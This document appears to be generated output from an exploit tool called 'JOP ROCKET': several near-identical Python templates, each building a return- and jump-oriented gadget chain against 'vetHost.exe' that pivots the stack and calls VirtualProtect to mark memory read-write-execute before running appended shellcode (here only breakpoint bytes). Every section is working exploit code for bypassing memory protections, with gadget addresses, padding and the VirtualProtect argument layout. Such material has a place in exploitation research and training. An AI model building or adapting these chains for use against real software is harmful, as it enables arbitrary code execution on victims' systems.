# VirtualProtect() JOP chain set up for functional gadgets ending in Jmp/Call EDI #4


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11017295, # (base + 0x17295), # pop edi # ret  # vetHost.exe   Load EDI with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b6, # (base + 0x31b6), # pop ecx # mov eax, esi # pop esi # jmp edx # vetHost.exe  [0x8 bytes]** 0x8
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b6, # (base + 0x31b6), # pop ecx # mov eax, esi # pop esi # jmp edx # vetHost.exe  [0x8 bytes]** 0x10
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b6, # (base + 0x31b6), # pop ecx # mov eax, esi # pop esi # jmp edx # vetHost.exe  [0x8 bytes]** 0x18
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b6, # (base + 0x31b6), # pop ecx # mov eax, esi # pop esi # jmp edx # vetHost.exe  [0x8 bytes]** 0x20
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b6, # (base + 0x31b6), # pop ecx # mov eax, esi # pop esi # jmp edx # vetHost.exe  [0x8 bytes]** 0x28
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b6, # (base + 0x31b6), # pop ecx # mov eax, esi # pop esi # jmp edx # vetHost.exe  [0x8 bytes]** 0x30
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b6, # (base + 0x31b6), # pop ecx # mov eax, esi # pop esi # jmp edx # vetHost.exe  [0x8 bytes]** 0x38
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b6, # (base + 0x31b6), # pop ecx # mov eax, esi # pop esi # jmp edx # vetHost.exe  [0x8 bytes]** 0x40
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b6, # (base + 0x31b6), # pop ecx # mov eax, esi # pop esi # jmp edx # vetHost.exe  [0x8 bytes]** 0x48
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b6, # (base + 0x31b6), # pop ecx # mov eax, esi # pop esi # jmp edx # vetHost.exe  [0x8 bytes]** 0x50
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b6, # (base + 0x31b6), # pop ecx # mov eax, esi # pop esi # jmp edx # vetHost.exe  [0x8 bytes]** 0x58
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b6, # (base + 0x31b6), # pop ecx # mov eax, esi # pop esi # jmp edx # vetHost.exe  [0x8 bytes]** 0x60
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b6, # (base + 0x31b6), # pop ecx # mov eax, esi # pop esi # jmp edx # vetHost.exe  [0x8 bytes]** 0x68
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b6, # (base + 0x31b6), # pop ecx # mov eax, esi # pop esi # jmp edx # vetHost.exe  [0x8 bytes]** 0x70
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100255f, # (base + 0x255f), # add esp, 0x11 # jmp edi # vetHost.exe  [0x11 bytes] 0x81
		# N----> STACK PIVOT TOTAL: 0x81 bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualProtect
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0x11018030) # ptr -> VirtualProtect()
vp_stack += struct.pack('<L', 0x0042DEAD) # return address  <-- where you want it to return
vp_stack += struct.pack('<L', 0x00425000) # lpAddress  <-- Where you want to start modifying proctection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00000040) # flNewProtect <-- RWX
vp_stack += struct.pack('<L', 0x00420000) # lpflOldProtect <--  MUST be writable location

shellcode = '\xcc\xcc\xcc\xcc'
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualProtect() JOP chain set up for functional gadgets ending in Jmp/Call EDI #5


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11017295, # (base + 0x17295), # pop edi # ret  # vetHost.exe   Load EDI with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c71, # (base + 0x1c71), # pop esi # pop eax # mov ebx, eax # jmp edi # vetHost.exe  [0x8 bytes]** 0x8
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c71, # (base + 0x1c71), # pop esi # pop eax # mov ebx, eax # jmp edi # vetHost.exe  [0x8 bytes]** 0x10
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c71, # (base + 0x1c71), # pop esi # pop eax # mov ebx, eax # jmp edi # vetHost.exe  [0x8 bytes]** 0x18
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c71, # (base + 0x1c71), # pop esi # pop eax # mov ebx, eax # jmp edi # vetHost.exe  [0x8 bytes]** 0x20
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c71, # (base + 0x1c71), # pop esi # pop eax # mov ebx, eax # jmp edi # vetHost.exe  [0x8 bytes]** 0x28
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c71, # (base + 0x1c71), # pop esi # pop eax # mov ebx, eax # jmp edi # vetHost.exe  [0x8 bytes]** 0x30
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c71, # (base + 0x1c71), # pop esi # pop eax # mov ebx, eax # jmp edi # vetHost.exe  [0x8 bytes]** 0x38
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c71, # (base + 0x1c71), # pop esi # pop eax # mov ebx, eax # jmp edi # vetHost.exe  [0x8 bytes]** 0x40
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c71, # (base + 0x1c71), # pop esi # pop eax # mov ebx, eax # jmp edi # vetHost.exe  [0x8 bytes]** 0x48
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c71, # (base + 0x1c71), # pop esi # pop eax # mov ebx, eax # jmp edi # vetHost.exe  [0x8 bytes]** 0x50
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c71, # (base + 0x1c71), # pop esi # pop eax # mov ebx, eax # jmp edi # vetHost.exe  [0x8 bytes]** 0x58
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c71, # (base + 0x1c71), # pop esi # pop eax # mov ebx, eax # jmp edi # vetHost.exe  [0x8 bytes]** 0x60
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c71, # (base + 0x1c71), # pop esi # pop eax # mov ebx, eax # jmp edi # vetHost.exe  [0x8 bytes]** 0x68
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c71, # (base + 0x1c71), # pop esi # pop eax # mov ebx, eax # jmp edi # vetHost.exe  [0x8 bytes]** 0x70
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100255f, # (base + 0x255f), # add esp, 0x11 # jmp edi # vetHost.exe  [0x11 bytes] 0x81
		# N----> STACK PIVOT TOTAL: 0x81 bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualProtect
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0x11018030) # ptr -> VirtualProtect()
vp_stack += struct.pack('<L', 0x0042DEAD) # return address  <-- where you want it to return
vp_stack += struct.pack('<L', 0x00425000) # lpAddress  <-- Where you want to start modifying proctection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00000040) # flNewProtect <-- RWX
vp_stack += struct.pack('<L', 0x00420000) # lpflOldProtect <--  MUST be writable location

shellcode = '\xcc\xcc\xcc\xcc'
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualProtect() JOP chain set up for functional gadgets ending in Jmp/Call ESI #1


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11011a32, # (base + 0x11a32), # pop esi # ret  # vetHost.exe   Load ESI with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b1, # (base + 0x31b1), # add esp, 0x3c # jmp esi # vetHost.exe  [0x3c bytes]** 0x3c
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100318b, # (base + 0x318b), # add esp, 0x24 # xor eax, eax # pop edi # jmp esi # vetHost.exe  [0x28 bytes] 0x64
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100318b, # (base + 0x318b), # add esp, 0x24 # xor eax, eax # pop edi # jmp esi # vetHost.exe  [0x28 bytes] 0x8c **^ 
		# N----> STACK PIVOT TOTAL: 0x8c bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualProtect
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0x11018030) # ptr -> VirtualProtect()
vp_stack += struct.pack('<L', 0x0042DEAD) # return address  <-- where you want it to return
vp_stack += struct.pack('<L', 0x00425000) # lpAddress  <-- Where you want to start modifying proctection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00000040) # flNewProtect <-- RWX
vp_stack += struct.pack('<L', 0x00420000) # lpflOldProtect <--  MUST be writable location

shellcode = '\xcc\xcc\xcc\xcc'
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualProtect() JOP chain set up for functional gadgets ending in Jmp/Call ESI #2


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11011a32, # (base + 0x11a32), # pop esi # ret  # vetHost.exe   Load ESI with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100318b, # (base + 0x318b), # add esp, 0x24 # xor eax, eax # pop edi # jmp esi # vetHost.exe  [0x28 bytes]** 0x28
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100318b, # (base + 0x318b), # add esp, 0x24 # xor eax, eax # pop edi # jmp esi # vetHost.exe  [0x28 bytes]** 0x50
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100318b, # (base + 0x318b), # add esp, 0x24 # xor eax, eax # pop edi # jmp esi # vetHost.exe  [0x28 bytes] 0x78
		# N----> STACK PIVOT TOTAL: 0x78 bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualProtect
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0x11018030) # ptr -> VirtualProtect()
vp_stack += struct.pack('<L', 0x0042DEAD) # return address  <-- where you want it to return
vp_stack += struct.pack('<L', 0x00425000) # lpAddress  <-- Where you want to start modifying proctection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00000040) # flNewProtect <-- RWX
vp_stack += struct.pack('<L', 0x00420000) # lpflOldProtect <--  MUST be writable location

shellcode = '\xcc\xcc\xcc\xcc'
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualProtect() JOP chain set up for functional gadgets ending in Jmp/Call ESI #3


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11011a32, # (base + 0x11a32), # pop esi # ret  # vetHost.exe   Load ESI with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11003182, # (base + 0x3182), # add esp, 0x14 # or eax, 0xffffffff # pop edi # jmp esi # vetHost.exe  [0x18 bytes]** 0x18
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11003182, # (base + 0x3182), # add esp, 0x14 # or eax, 0xffffffff # pop edi # jmp esi # vetHost.exe  [0x18 bytes]** 0x30
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11003182, # (base + 0x3182), # add esp, 0x14 # or eax, 0xffffffff # pop edi # jmp esi # vetHost.exe  [0x18 bytes]** 0x48
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11003182, # (base + 0x3182), # add esp, 0x14 # or eax, 0xffffffff # pop edi # jmp esi # vetHost.exe  [0x18 bytes]** 0x60
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100318b, # (base + 0x318b), # add esp, 0x24 # xor eax, eax # pop edi # jmp esi # vetHost.exe  [0x28 bytes] 0x88
		# N----> STACK PIVOT TOTAL: 0x88 bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualProtect
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0x11018030) # ptr -> VirtualProtect()
vp_stack += struct.pack('<L', 0x0042DEAD) # return address  <-- where you want it to return
vp_stack += struct.pack('<L', 0x00425000) # lpAddress  <-- Where you want to start modifying proctection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00000040) # flNewProtect <-- RWX
vp_stack += struct.pack('<L', 0x00420000) # lpflOldProtect <--  MUST be writable location

shellcode = '\xcc\xcc\xcc\xcc'
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualProtect() JOP chain set up for functional gadgets ending in Jmp/Call ESI #4


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11011a32, # (base + 0x11a32), # pop esi # ret  # vetHost.exe   Load ESI with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013af, # (base + 0x13af), # pop ebx # add esp, 0x10 # jmp edx # vetHost.exe  [0x14 bytes]** 0x14
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013af, # (base + 0x13af), # pop ebx # add esp, 0x10 # jmp edx # vetHost.exe  [0x14 bytes]** 0x28
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013af, # (base + 0x13af), # pop ebx # add esp, 0x10 # jmp edx # vetHost.exe  [0x14 bytes]** 0x3c
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013af, # (base + 0x13af), # pop ebx # add esp, 0x10 # jmp edx # vetHost.exe  [0x14 bytes]** 0x50
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013af, # (base + 0x13af), # pop ebx # add esp, 0x10 # jmp edx # vetHost.exe  [0x14 bytes]** 0x64
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100318b, # (base + 0x318b), # add esp, 0x24 # xor eax, eax # pop edi # jmp esi # vetHost.exe  [0x28 bytes] 0x8c
		# N----> STACK PIVOT TOTAL: 0x8c bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualProtect
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0x11018030) # ptr -> VirtualProtect()
vp_stack += struct.pack('<L', 0x0042DEAD) # return address  <-- where you want it to return
vp_stack += struct.pack('<L', 0x00425000) # lpAddress  <-- Where you want to start modifying proctection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00000040) # flNewProtect <-- RWX
vp_stack += struct.pack('<L', 0x00420000) # lpflOldProtect <--  MUST be writable location

shellcode = '\xcc\xcc\xcc\xcc'
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualProtect() JOP chain set up for functional gadgets ending in Jmp/Call ESI #5


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11011a32, # (base + 0x11a32), # pop esi # ret  # vetHost.exe   Load ESI with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013b0, # (base + 0x13b0), # add esp, 0x10 # jmp edx # vetHost.exe  [0x10 bytes]** 0x10
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013b0, # (base + 0x13b0), # add esp, 0x10 # jmp edx # vetHost.exe  [0x10 bytes]** 0x20
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013b0, # (base + 0x13b0), # add esp, 0x10 # jmp edx # vetHost.exe  [0x10 bytes]** 0x30
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013b0, # (base + 0x13b0), # add esp, 0x10 # jmp edx # vetHost.exe  [0x10 bytes]** 0x40
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013b0, # (base + 0x13b0), # add esp, 0x10 # jmp edx # vetHost.exe  [0x10 bytes]** 0x50
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013b0, # (base + 0x13b0), # add esp, 0x10 # jmp edx # vetHost.exe  [0x10 bytes]** 0x60
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013b0, # (base + 0x13b0), # add esp, 0x10 # jmp edx # vetHost.exe  [0x10 bytes]** 0x70
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100318b, # (base + 0x318b), # add esp, 0x24 # xor eax, eax # pop edi # jmp esi # vetHost.exe  [0x28 bytes] 0x98
		# N----> STACK PIVOT TOTAL: 0x98 bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualProtect
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0x11018030) # ptr -> VirtualProtect()
vp_stack += struct.pack('<L', 0x0042DEAD) # return address  <-- where you want it to return
vp_stack += struct.pack('<L', 0x00425000) # lpAddress  <-- Where you want to start modifying proctection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00000040) # flNewProtect <-- RWX
vp_stack += struct.pack('<L', 0x00420000) # lpflOldProtect <--  MUST be writable location

shellcode = '\xcc\xcc\xcc\xcc'
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET


